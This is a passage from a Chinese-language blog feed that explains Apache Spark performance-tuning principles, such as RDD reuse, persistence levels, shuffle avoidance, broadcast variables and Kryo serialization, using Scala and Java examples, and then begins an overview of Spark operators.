class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 需要对名为“hello.txt”的HDFS文件进行一次map操作，再进行一次reduce操作。也就是说，需要对一份数据执行两次算子操作。</span><br><span class="line"></span><br><span class="line">// 错误的做法：对于同一份数据执行多次算子操作时，创建多个RDD。</span><br><span class="line">// 这里执行了两次textFile方法，针对同一个HDFS文件，创建了两个RDD出来，然后分别对每个RDD都执行了一个算子操作。</span><br><span class="line">// 这种情况下，Spark需要从HDFS上两次加载hello.txt文件的内容，并创建两个单独的RDD；第二次加载HDFS文件以及创建RDD的性能开销，很明显是白白浪费掉的。</span><br><span class="line">val rdd1 = sc.textFile(&quot;hdfs://192.168.0.1:9000/hello.txt&quot;)</span><br><span class="line">rdd1.map(...)</span><br><span class="line">val rdd2 = sc.textFile(&quot;hdfs://192.168.0.1:9000/hello.txt&quot;)</span><br><span class="line">rdd2.reduce(...)</span><br><span class="line"></span><br><span class="line">// 正确的用法：对于一份数据执行多次算子操作时，只使用一个RDD。</span><br><span class="line">// 这种写法很明显比上一种写法要好多了，因为我们对于同一份数据只创建了一个RDD，然后对这一个RDD执行了多次算子操作。</span><br><span class="line">// 但是要注意到这里为止优化还没有结束，由于rdd1被执行了两次算子操作，第二次执行reduce操作的时候，还会再次从源头处重新计算一次rdd1的数据，因此还是会有重复计算的性能开销。</span><br><span class="line">// 要彻底解决这个问题，必须结合“原则三：对多次使用的RDD进行持久化”，才能保证一个RDD被多次使用时只被计算一次。</span><br><span class="line">val rdd1 = sc.textFile(&quot;hdfs://192.168.0.1:9000/hello.txt&quot;)</span><br><span class="line">rdd1.map(...)</span><br><span class="line">rdd1.reduce(...)</span><br></pre></td></tr></table></figure><p><img src="/blog/b222527c.html/1648795120926-e6c6fea0-1a01-4481-8ffc-3bdf0551b1ad.png" alt="img"></p><p>如果要求持久化数据可能丢失的情况下，还是要保证高性能，那么就在第一次计算RDD 时，消耗一些性能，对 RDD 进行 checkpoint 操作。这样，即使持久化数据丢失了，也可以直接读取其 checkpoint 数据。</p><h2 id="原则二：尽可能复用同一个RDD"><a href="#原则二：尽可能复用同一个RDD" class="headerlink" title="原则二：尽可能复用同一个RDD"></a>原则二：尽可能复用同一个RDD</h2><p>除了要避免在开发过程中对一份完全相同的数据创建多个RDD之外，在对不同的数据执行算子操作时还要尽可能地复用一个RDD。比如说，有一个RDD的数据格式是key-value类型的，另一个是单value类型的，这两个RDD的value数据是完全一样的。那么此时我们可以只使用key-value类型的那个RDD，因为其中已经包含了另一个的数据。对于类似这种多个RDD的数据有重叠或者包含的情况，我们应该尽量复用一个RDD，这样可以尽可能地减少RDD的数量，从而尽可能减少算子执行的次数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 错误的做法。</span><br><span class="line"></span><br><span class="line">// 有一个&lt;Long, String&gt;格式的RDD，即rdd1。</span><br><span class="line">// 接着由于业务需要，对rdd1执行了一个map操作，创建了一个rdd2，而rdd2中的数据仅仅是rdd1中的value值而已，也就是说，rdd2是rdd1的子集。</span><br><span class="line">JavaPairRDD&lt;Long, String&gt; rdd1 = ...</span><br><span class="line">JavaRDD&lt;String&gt; rdd2 = rdd1.map(...)</span><br><span class="line"></span><br><span class="line">// 分别对rdd1和rdd2执行了不同的算子操作。</span><br><span class="line">rdd1.reduceByKey(...)</span><br><span class="line">rdd2.map(...)</span><br><span class="line"></span><br><span class="line">// 正确的做法。</span><br><span class="line"></span><br><span class="line">// 上面这个case中，其实rdd1和rdd2的区别无非就是数据格式不同而已，rdd2的数据完全就是rdd1的子集而已，却创建了两个rdd，并对两个rdd都执行了一次算子操作。</span><br><span class="line">// 此时会因为对rdd1执行map算子来创建rdd2，而多执行一次算子操作，进而增加性能开销。</span><br><span class="line"></span><br><span class="line">// 其实在这种情况下完全可以复用同一个RDD。</span><br><span class="line">// 我们可以使用rdd1，既做reduceByKey操作，也做map操作。</span><br><span class="line">// 在进行第二个map操作时，只使用每个数据的tuple._2，也就是rdd1中的value值，即可。</span><br><span class="line">JavaPairRDD&lt;Long, String&gt; rdd1 = ...</span><br><span class="line">rdd1.reduceByKey(...)</span><br><span class="line">rdd1.map(tuple._2...)</span><br><span class="line"></span><br><span class="line">// 第二种方式相较于第一种方式而言，很明显减少了一次rdd2的计算开销。</span><br><span class="line">// 但是到这里为止，优化还没有结束，对rdd1我们还是执行了两次算子操作，rdd1实际上还是会被计算两次。</span><br><span class="line">// 因此还需要配合“原则三：对多次使用的RDD进行持久化”进行使用，才能保证一个RDD被多次使用时只被计算一次。</span><br></pre></td></tr></table></figure><h2 id="原则三：对多次使用的RDD进行持久化"><a href="#原则三：对多次使用的RDD进行持久化" class="headerlink" title="原则三：对多次使用的RDD进行持久化"></a>原则三：对多次使用的RDD进行持久化</h2><p>当你在Spark代码中多次对一个RDD做了算子操作后，恭喜，你已经实现Spark作业第一步的优化了，也就是尽可能复用RDD。此时就该在这个基础之上，进行第二步优化了，也就是要保证对一个RDD执行多次算子操作时，这个RDD本身仅仅被计算一次。</p><p>Spark中对于一个RDD执行多次算子的默认原理是这样的：每次你对一个RDD执行一个算子操作时，都会重新从源头处计算一遍，计算出那个RDD来，然后再对这个RDD执行你的算子操作。这种方式的性能是很差的。</p><p>因此对于这种情况，我们的建议是：对多次使用的RDD进行持久化。此时Spark就会根据你的持久化策略，将RDD中的数据保存到内存或者磁盘中。以后每次对这个RDD进行算子操作时，都会直接从内存或磁盘中提取持久化的RDD数据，然后执行算子，而不会从源头处重新计算一遍这个RDD，再执行算子操作。</p><p><strong>对多次使用的RDD进行持久化的代码示例</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果要对一个RDD进行持久化，只要对这个RDD调用cache()和persist()即可。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的做法。</span></span><br><span class="line"><span class="comment">// cache()方法表示：使用非序列化的方式将RDD中的数据全部尝试持久化到内存中。</span></span><br><span class="line"><span class="comment">// 此时再对rdd1执行两次算子操作时，只有在第一次执行map算子时，才会将这个rdd1从源头处计算一次。</span></span><br><span class="line"><span class="comment">// 第二次执行reduce算子时，就会直接从内存中提取数据进行计算，不会重复计算一个rdd。</span></span><br><span class="line"><span class="keyword">val</span> rdd1 = sc.textFile(<span class="string">&quot;hdfs://192.168.0.1:9000/hello.txt&quot;</span>).cache()</span><br><span class="line">rdd1.map(...)</span><br><span class="line">rdd1.reduce(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// persist()方法表示：手动选择持久化级别，并使用指定的方式进行持久化。</span></span><br><span class="line"><span class="comment">// 比如说，StorageLevel.MEMORY_AND_DISK_SER表示，内存充足时优先持久化到内存中，内存不充足时持久化到磁盘文件中。</span></span><br><span class="line"><span class="comment">// 而且其中的_SER后缀表示，使用序列化的方式来保存RDD数据，此时RDD中的每个partition都会序列化成一个大的字节数组，然后再持久化到内存或磁盘中。</span></span><br><span class="line"><span class="comment">// 序列化的方式可以减少持久化的数据对内存/磁盘的占用量，进而避免内存被持久化数据占用过多，从而发生频繁GC。</span></span><br><span class="line"><span class="keyword">val</span> rdd1 = sc.textFile(<span class="string">&quot;hdfs://192.168.0.1:9000/hello.txt&quot;</span>).persist(<span class="type">StorageLevel</span>.<span class="type">MEMORY_AND_DISK_SER</span>)</span><br><span class="line">rdd1.map(...)</span><br><span class="line">rdd1.reduce(...)</span><br></pre></td></tr></table></figure><p><strong>Spark的持久化级别</strong></p><table><thead><tr><th><strong>持久化级别</strong></th><th><strong>含义解释</strong></th></tr></thead><tbody><tr><td>MEMORY_ONLY</td><td>使用未序列化的Java对象格式，将数据保存在内存中。如果内存不够存放所有的数据，则数据可能就不会进行持久化。那么下次对这个RDD执行算子操作时，那些没有被持久化的数据，需要从源头处重新计算一遍。这是默认的持久化策略，使用cache()方法时，实际就是使用的这种持久化策略。</td></tr><tr><td>MEMORY_AND_DISK</td><td>使用未序列化的Java对象格式，优先尝试将数据保存在内存中。如果内存不够存放所有的数据，会将数据写入磁盘文件中，下次对这个RDD执行算子时，持久化在磁盘文件中的数据会被读取出来使用。</td></tr><tr><td>MEMORY_ONLY_SER</td><td>基本含义同MEMORY_ONLY。唯一的区别是，会将RDD中的数据进行序列化，RDD的每个partition会被序列化成一个字节数组。这种方式更加节省内存，从而可以避免持久化的数据占用过多内存导致频繁GC。</td></tr><tr><td>MEMORY_AND_DISK_SER</td><td>基本含义同MEMORY_AND_DISK。唯一的区别是，会将RDD中的数据进行序列化，RDD的每个partition会被序列化成一个字节数组。这种方式更加节省内存，从而可以避免持久化的数据占用过多内存导致频繁GC。</td></tr><tr><td>DISK_ONLY</td><td>使用未序列化的Java对象格式，将数据全部写入磁盘文件中。</td></tr><tr><td>MEMORY_ONLY_2, MEMORY_AND_DISK_2, 等等.</td><td>对于上述任意一种持久化策略，如果加上后缀_2，代表的是将每个持久化的数据，都复制一份副本，并将副本保存到其他节点上。这种基于副本的持久化机制主要用于进行容错。假如某个节点挂掉，节点的内存或磁盘中的持久化数据丢失了，那么后续对RDD计算时还可以使用该数据在其他节点上的副本。如果没有副本的话，就只能将这些数据从源头处重新计算一遍了。</td></tr></tbody></table><p>持久化：写入磁盘中</p><p>序列化：将RDD的转换为字节数组</p><p><strong>如何选择一种最合适的持久化策略</strong></p><ul><li>默认情况下，性能最高的当然是MEMORY_ONLY，但前提是你的内存必须足够足够大，可以绰绰有余地存放下整个RDD的所有数据。因为不进行序列化与反序列化操作，就避免了这部分的性能开销；对这个RDD的后续算子操作，都是基于纯内存中的数据的操作，不需要从磁盘文件中读取数据，性能也很高；而且不需要复制一份数据副本，并远程传送到其他节点上。但是这里必须要注意的是，在实际的生产环境中，恐怕能够直接用这种策略的场景还是有限的，如果RDD中数据比较多时（比如几十亿），直接用这种持久化级别，会导致JVM的OOM内存溢出异常。</li><li>如果使用MEMORY_ONLY级别时发生了内存溢出，那么建议尝试使用MEMORY_ONLY_SER级别。该级别会将RDD数据序列化后再保存在内存中，此时每个partition仅仅是一个字节数组而已，大大减少了对象数量，并降低了内存占用。这种级别比MEMORY_ONLY多出来的性能开销，主要就是序列化与反序列化的开销。但是后续算子可以基于纯内存进行操作，因此性能总体还是比较高的。此外，可能发生的问题同上，如果RDD中的数据量过多的话，还是可能会导致OOM内存溢出的异常。</li><li>如果纯内存的级别都无法使用，那么建议使用MEMORY_AND_DISK_SER策略，而不是MEMORY_AND_DISK策略。因为既然到了这一步，就说明RDD的数据量很大，内存无法完全放下。序列化后的数据比较少，可以节省内存和磁盘的空间开销。同时该策略会优先尽量尝试将数据缓存在内存中，内存缓存不下才会写入磁盘。</li><li>通常不建议使用DISK_ONLY和后缀为_2的级别：因为完全基于磁盘文件进行数据的读写，会导致性能急剧降低，有时还不如重新计算一次所有RDD。后缀为_2的级别，必须将所有数据都复制一份副本，并发送到其他节点上，数据复制以及网络传输会导致较大的性能开销，除非是要求作业的高可用性，否则不建议使用。</li></ul><h2 id="原则四：尽量避免使用shuffle类算子"><a href="#原则四：尽量避免使用shuffle类算子" class="headerlink" title="原则四：尽量避免使用shuffle类算子"></a>原则四：尽量避免使用shuffle类算子</h2><p>如果有可能的话，要尽量避免使用shuffle类算子。因为Spark作业运行过程中，最消耗性能的地方就是shuffle过程。shuffle过程，简单来说，就是<strong>将分布在集群中多个节点上的同一个key，拉取到同一个节点上，进行聚合或join等操作</strong>。比如<strong>reduceByKey</strong>、<strong>join</strong>等算子，都会触发shuffle操作。</p><p>shuffle过程中，各个节点上的相同key都会先写入本地磁盘文件中，然后其他节点需要通过网络传输拉取各个节点上的磁盘文件中的相同key。而且相同key都拉取到同一个节点进行聚合操作时，还有可能会因为一个节点上处理的key过多，导致内存不够存放，进而溢写到磁盘文件中。因此在shuffle过程中，可能会<strong>发生大量的磁盘文件读写的IO操作，以及数据的网络传输操作</strong>。磁盘IO和网络数据传输也是shuffle性能较差的主要原因。</p><p>因此在我们的开发过程中，<strong>能避免则尽可能避免使用reduceByKey、join、distinct、repartition等会进行shuffle的算子，尽量使用map类的非shuffle算子。</strong>这样的话，没有shuffle操作或者仅有较少shuffle操作的Spark作业，可以大大减少性能开销。</p><p><strong>Broadcast与map进行join代码示例</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传统的join操作会导致shuffle操作。</span></span><br><span class="line"><span class="comment">// 因为两个RDD中，相同的key都需要通过网络拉取到一个节点上，由一个task进行join操作。</span></span><br><span class="line"><span class="keyword">val</span> rdd3 = rdd1.join(rdd2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Broadcast+map的join操作，不会导致shuffle操作。</span></span><br><span class="line"><span class="comment">// 使用Broadcast将一个数据量较小的RDD作为广播变量。</span></span><br><span class="line"><span class="keyword">val</span> rdd2Data = rdd2.collect()</span><br><span class="line"><span class="keyword">val</span> rdd2DataBroadcast = sc.broadcast(rdd2Data)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在rdd1.map算子中，可以从rdd2DataBroadcast中，获取rdd2的所有数据。</span></span><br><span class="line"><span class="comment">// 然后进行遍历，如果发现rdd2中某条数据的key与rdd1的当前数据的key是相同的，那么就判定可以进行join。</span></span><br><span class="line"><span class="comment">// 此时就可以根据自己需要的方式，将rdd1当前数据与rdd2中可以连接的数据，拼接在一起（String或Tuple）。</span></span><br><span class="line"><span class="keyword">val</span> rdd3 = rdd1.map(rdd2DataBroadcast...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，以上操作，建议仅仅在rdd2的数据量比较少（比如几百M，或者一两G）的情况下使用。</span></span><br><span class="line"><span class="comment">// 因为每个Executor的内存中，都会驻留一份rdd2的全量数据。</span></span><br></pre></td></tr></table></figure><h2 id="原则五：使用map-side预聚合的shuffle操作"><a href="#原则五：使用map-side预聚合的shuffle操作" class="headerlink" title="原则五：使用map-side预聚合的shuffle操作"></a>原则五：使用map-side预聚合的shuffle操作</h2><p>spark.shuffle.consolidateFiles</p><p>如果因为业务需要，一定要使用shuffle操作，无法用map类的算子来替代，那么尽量使用可以map-side预聚合的算子。</p><p>所谓的map-side预聚合，说的是在每个节点本地对相同的key进行一次聚合操作，类似于MapReduce中的本地combiner。map-side预聚合之后，每个节点本地就只会有一条相同的key，因为多条相同的key都被聚合起来了。其他节点在拉取所有节点上的相同key时，就会大大减少需要拉取的数据数量，从而也就减少了磁盘IO以及网络传输开销。通常来说，在可能的情况下，建议使用reduceByKey或者aggregateByKey算子来替代掉groupByKey算子。因为reduceByKey和aggregateByKey算子都会使用用户自定义的函数对每个节点本地的相同key进行预聚合。而groupByKey算子是不会进行预聚合的，全量的数据会在集群的各个节点之间分发和传输，性能相对来说比较差。</p><p>比如如下两幅图，就是典型的例子，分别基于reduceByKey和groupByKey进行单词计数。其中第一张图是groupByKey的原理图，可以看到，没有进行任何本地聚合时，所有数据都会在集群节点之间传输；第二张图是reduceByKey的原理图，可以看到，每个节点本地的相同key数据，都进行了预聚合，然后才传输到其他节点上进行全局聚合。</p><p><strong>第一张图是groupByKey的原理图，可以看到，没有进行任何本地聚合时，所有数据都会在集群节点之间传输；</strong></p><p><img src="/blog/b222527c.html/1648804303841-ea514c86-2c77-4231-92c6-c634540d78ac.png" alt="img"></p><p><strong>第二张图是reduceByKey的原理图，可以看到，每个节点本地的相同key数据，都进行了预聚合，然后才传输到其他节点上进行全局聚合。</strong></p><p>第二张图是reduceByKey的原理图，可以看到，每个节点本地的相同key数据，都进行了预聚合，然后才传输到其他节点上进行全局聚合。</p><p><img src="/blog/b222527c.html/1648804507865-7f2d5a07-bfd6-4943-b1f1-beb5f9c11542.png" alt="img"></p><h2 id="原则六：使用高性能的算子"><a href="#原则六：使用高性能的算子" class="headerlink" title="原则六：使用高性能的算子"></a>原则六：使用高性能的算子</h2><p>除了shuffle相关的算子有优化原则之外，其他的算子也都有着相应的优化原则。</p><p><strong>使用reduceByKey&#x2F;aggregateByKey替代groupByKey</strong></p><p><strong>使用mapPartitions替代普通map</strong></p><p>mapPartitions类的算子，一次函数调用会处理一个partition所有的数据，而不是一次函数调用处理一条，性能相对来说会高一些。但是有的时候，使用mapPartitions会出现OOM（内存溢出）的问题。因为单次函数调用就要处理掉一个partition所有的数据，如果内存不够，垃圾回收时是无法回收掉太多对象的，很可能出现OOM异常。所以使用这类操作时要慎重！</p><p><strong>使用foreachPartitions替代foreach</strong></p><p>原理类似于“使用mapPartitions替代map”，也是一次函数调用处理一个partition的所有数据，而不是一次函数调用处理一条数据。在实践中发现，foreachPartitions类的算子，对性能的提升还是很有帮助的。比如在foreach函数中，将RDD中所有数据写MySQL，那么如果是普通的foreach算子，就会一条数据一条数据地写，每次函数调用可能就会创建一个数据库连接，此时就势必会频繁地创建和销毁数据库连接，性能是非常低下；但是如果用foreachPartitions算子一次性处理一个partition的数据，那么对于每个partition，只要创建一个数据库连接即可，然后执行批量插入操作，此时性能是比较高的。实践中发现，对于1万条左右的数据量写MySQL，性能可以提升30%以上。</p><p><strong>使用filter之后进行coalesce操作</strong></p><p>通常对一个RDD执行filter算子过滤掉RDD中较多数据后（比如30%以上的数据），建议使用coalesce算子，手动减少RDD的partition数量，将RDD中的数据压缩到更少的partition中去。因为filter之后，RDD的每个partition中都会有很多数据被过滤掉，此时如果照常进行后续的计算，其实每个task处理的partition中的数据量并不是很多，有一点资源浪费，而且此时处理的task越多，可能速度反而越慢。因此用coalesce减少partition数量，将RDD中的数据压缩到更少的partition之后，只要使用更少的task即可处理完所有的partition。在某些场景下，对于性能的提升会有一定的帮助。</p><p><strong>使用repartitionAndSortWithinPartitions替代repartition与sort类操作</strong></p><p>repartitionAndSortWithinPartitions是Spark官网推荐的一个算子，官方建议，如果需要在repartition重分区之后，还要进行排序，建议直接使用repartitionAndSortWithinPartitions算子。因为该算子可以一边进行重分区的shuffle操作，一边进行排序。shuffle与sort两个操作同时进行，比先shuffle再sort来说，性能可能是要高的。</p><h2 id="原则七：广播大变量"><a href="#原则七：广播大变量" class="headerlink" title="原则七：广播大变量"></a>原则七：广播大变量</h2><p>有时在开发过程中，会遇到需要在算子函数中使用外部变量的场景（尤其是大变量，比如100M以上的大集合），那么此时就应该使用Spark的广播（Broadcast）功能来提升性能。</p><p>在算子函数中使用到外部变量时，默认情况下，Spark会将该变量复制多个副本，通过网络传输到task中，此时每个task都有一个变量副本。如果变量本身比较大的话（比如100M，甚至1G），那么大量的变量副本在网络中传输的性能开销，以及在各个节点的Executor中占用过多内存导致的频繁GC，都会极大地影响性能。</p><p>因此对于上述情况，如果使用的外部变量比较大，建议使用Spark的广播功能，对该变量进行广播。广播后的变量，会保证每个Executor的内存中，只驻留一份变量副本，而Executor中的task执行时共享该Executor中的那份变量副本。这样的话，可以大大减少变量副本的数量，从而减少网络传输的性能开销，并减少对Executor内存的占用开销，降低GC的频率。</p><p><strong>广播大变量的代码示例</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下代码在算子函数中，使用了外部的变量。</span></span><br><span class="line"><span class="comment">// 此时没有做任何特殊操作，每个task都会有一份list1的副本。</span></span><br><span class="line"><span class="keyword">val</span> list1 = ...</span><br><span class="line">rdd1.map(list1...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下代码将list1封装成了Broadcast类型的广播变量。</span></span><br><span class="line"><span class="comment">// 在算子函数中，使用广播变量时，首先会判断当前task所在Executor内存中，是否有变量副本。</span></span><br><span class="line"><span class="comment">// 如果有则直接使用；如果没有则从Driver或者其他Executor节点上远程拉取一份放到本地Executor内存中。</span></span><br><span class="line"><span class="comment">// 每个Executor内存中，就只会驻留一份广播变量副本。</span></span><br><span class="line"><span class="keyword">val</span> list1 = ...</span><br><span class="line"><span class="keyword">val</span> list1Broadcast = sc.broadcast(list1)</span><br><span class="line">rdd1.map(list1Broadcast...)</span><br></pre></td></tr></table></figure><h2 id="原则八：使用Kryo优化序列化性能"><a href="#原则八：使用Kryo优化序列化性能" class="headerlink" title="原则八：使用Kryo优化序列化性能"></a>原则八：使用Kryo优化序列化性能</h2><p>在Spark中，主要有三个地方涉及到了序列化： </p><p>* 在算子函数中使用到外部变量时，该变量会被序列化后进行网络传输（见“原则七：广播大变量”中的讲解）。 </p><p>* 将自定义的类型作为RDD的泛型类型时（比如JavaRDD，Student是自定义类型），所有自定义类型对象，都会进行序列化。因此这种情况下，也要求自定义的类必须实现Serializable接口。 </p><p>* 使用可序列化的持久化策略时（比如MEMORY_ONLY_SER），Spark会将RDD中的每个partition都序列化成一个大的字节数组。</p><p>对于这三种出现序列化的地方，我们都可以通过使用Kryo序列化类库，来优化序列化和反序列化的性能。Spark默认使用的是Java的序列化机制，也就是ObjectOutputStream&#x2F;ObjectInputStream API来进行序列化和反序列化。但是Spark同时支持使用Kryo序列化库，Kryo序列化类库的性能比Java序列化类库的性能要高很多。官方介绍，Kryo序列化机制比Java序列化机制，<strong>性能高10倍左右</strong>。Spark之所以默认没有使用Kryo作为序列化类库，是因为<strong>Kryo要求最好要注册所有需要进行序列化的自定义类型</strong>，因此对于开发者来说，这种方式比较麻烦。</p><p>以下是使用Kryo的代码示例，我们只要设置序列化类，再注册要序列化的自定义类型即可（比如算子函数中使用到的外部变量类型、作为RDD泛型类型的自定义类型等）：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建SparkConf对象。</span></span><br><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(...).setAppName(...)</span><br><span class="line"><span class="comment">// 设置序列化器为KryoSerializer。</span></span><br><span class="line">conf.set(<span class="string">&quot;spark.serializer&quot;</span>, <span class="string">&quot;org.apache.spark.serializer.KryoSerializer&quot;</span>)</span><br><span class="line"><span class="comment">// 注册要序列化的自定义类型。</span></span><br><span class="line">conf.registerKryoClasses(<span class="type">Array</span>(classOf[<span class="type">MyClass1</span>], classOf[<span class="type">MyClass2</span>]))</span><br></pre></td></tr></table></figure><h2 id="原则九：优化数据结构"><a href="#原则九：优化数据结构" class="headerlink" title="原则九：优化数据结构"></a>原则九：优化数据结构</h2><p>Java中，有三种类型比较耗费内存： </p><p>* 对象，每个Java对象都有对象头、引用等额外的信息，因此比较占用内存空间。 </p><p>* 字符串，每个字符串内部都有一个字符数组以及长度等额外信息。 </p><p>* 集合类型，比如HashMap、LinkedList等，因为集合类型内部通常会使用一些内部类来封装集合元素，比如Map.Entry。</p><p>因此Spark官方建议，在Spark编码实现中，特别是对于算子函数中的代码，尽量不要使用上述三种数据结构，尽量使用字符串替代对象，使用原始类型（比如Int、Long）替代字符串，使用数组替代集合类型，这样尽可能地减少内存占用，从而降低GC频率，提升性能。</p><p>但是在笔者的编码实践中发现，要做到该原则其实并不容易。因为我们同时要考虑到代码的可维护性，如果一个代码中，完全没有任何对象抽象，全部是字符串拼接的方式，那么对于后续的代码维护和修改，无疑是一场巨大的灾难。同理，如果所有操作都基于数组实现，而不使用HashMap、LinkedList等集合类型，那么对于我们的编码难度以及代码可维护性，也是一个极大的挑战。因此笔者建议，在可能以及合适的情况下，使用占用内存较少的数据结构，但是前提是要保证代码的可维护性。</p>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 常用算子</title>
      <link href="/blog/bda70396.html/"/>
      <url>/blog/bda70396.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：算子概述"><a href="#一：算子概述" class="headerlink" title="一：算子概述"></a>一：算子概述</h1><h2 id="1-1-什么是算子？"><a href="#1-1-什么是算子？" class="headerlink" title="1.1 什么是算子？"></a>1.1 什么是算子？</h2><ul><li><p>英文：Operator</p></li><li><p>狭义：一个函数空间到另一个函数空间的映射</p></li><li><p>广义：一个空间到另个一个空间的映射</p></li><li><p>白话：一个事物从一个状态到另一个状态的过程</p></li><li><p>实质：映射，即关系</p></li></ul><h2 id="1-2-算子的重要作用"><a href="#1-2-算子的重要作用" class="headerlink" title="1.2 算子的重要作用"></a>1.2 算子的重要作用</h2><ul><li>算子越多，灵活性越高，编程的可选方式就越多</li><li>算子越多，表现能力强，可以灵活应对各种复杂场景</li></ul><h2 id="1-3-MapReduce-和-Spark-算子比较"><a href="#1-3-MapReduce-和-Spark-算子比较" class="headerlink" title="1.3 MapReduce 和 Spark 算子比较"></a>1.3 MapReduce 和 Spark 算子比较</h2><ul><li>MapReduce 只有2个算子，map和reduce，绝大多数场景下，需要复杂的编程来完成业务需求</li><li>Spark 有80多个算子，可以灵活组合应对不同的业务场景</li></ul><h1 id="二：Spark算子"><a href="#二：Spark算子" class="headerlink" title="二：Spark算子"></a>二：Spark算子</h1><h2 id="2-1-转换算子（transformation）"><a href="#2-1-转换算子（transformation）" class="headerlink" title="2.1 转换算子（transformation）"></a>2.1 转换算子（transformation）</h2><p>此种算子不会真正的触发提交作业，只有作业被提交后才会触发转换计算</p><ul><li>value型转换算子（处理的数据项是value型）<ul><li>输入分区：输出分区 &#x3D; 1 ： 1<ul><li>map算子</li><li>flatMap算子</li><li>mapPartitions算子</li></ul></li><li>输入分区：输出分区 &#x3D; n ： 1<ul><li>union算子</li><li>cartesian算子</li></ul></li><li>输入分区 ：输出分区 &#x3D; n ： n<ul><li>groupBy算子</li></ul></li><li>输出分区为输入分区的子集<ul><li>filter算子</li><li>distinct算子</li><li>substract算子</li><li>sample算子</li><li>takeSample算子</li></ul></li><li>cache型算子<ul><li>cache算子</li><li>persist算子</li></ul></li></ul></li><li>key-value型转换算子（处理的数据类型是key-value型）<ul><li>输入分区：输出分区 &#x3D; 1： 1<ul><li>mapValues 算子</li></ul></li><li>对单个RDD聚集<ul><li>combineByKey算子</li><li>reduceByKey算子</li><li>partitionBy算子</li></ul></li><li>对两个RDD聚合<ul><li>cogroup算子</li></ul></li><li>连接<ul><li>join算子</li><li>leftOutJoin算子</li><li>rightOutJoin算子</li></ul></li></ul></li></ul><h2 id="2-2-行动算子（action）"><a href="#2-2-行动算子（action）" class="headerlink" title="2.2 行动算子（action）"></a>2.2 行动算子（action）</h2><p>这种算子会触发sparkContent提交作业；</p><ul><li>无输出（不生成文件）<ul><li>foreach算子</li></ul></li><li>HDFS<ul><li>saveAsTextFile算子</li><li>saveAsObjectFile算子</li></ul></li><li>scala集合和数据类型<ul><li>collect算子</li><li>collectAsMap算子</li><li>reduceByKeyLocally算子</li><li>lookup算子</li><li>count算子</li><li>top算子</li><li>reduce算子</li><li>fold算子</li><li>aggregate算子</li></ul></li></ul><h1 id="三：常见算子的应用场景"><a href="#三：常见算子的应用场景" class="headerlink" title="三：常见算子的应用场景"></a>三：常见算子的应用场景</h1><h2 id="3-1-转换算子（transformation）"><a href="#3-1-转换算子（transformation）" class="headerlink" title="3.1 转换算子（transformation）"></a>3.1 转换算子（transformation）</h2><h3 id="3-1-1-value型转换算子"><a href="#3-1-1-value型转换算子" class="headerlink" title="3.1.1 value型转换算子"></a>3.1.1 value型转换算子</h3><h4 id="（1）map"><a href="#（1）map" class="headerlink" title="（1）map"></a>（1）map</h4><p>类比mapreduce中的map操作，给定一个输入，由map函数操作后，成为一个新的元素输出；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(List(&quot;Hello&quot;,&quot;Word&quot;,&quot;你好&quot;,&quot;世界&quot;),2)</span><br><span class="line">val second = first.map(_.length)</span><br><span class="line">second.collect</span><br></pre></td></tr></table></figure><p><img src="/blog/bda70396.html/1629361528641-4cccbb47-74f0-4033-a43f-a80da85ecadd.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val first = sc.parallelize(1 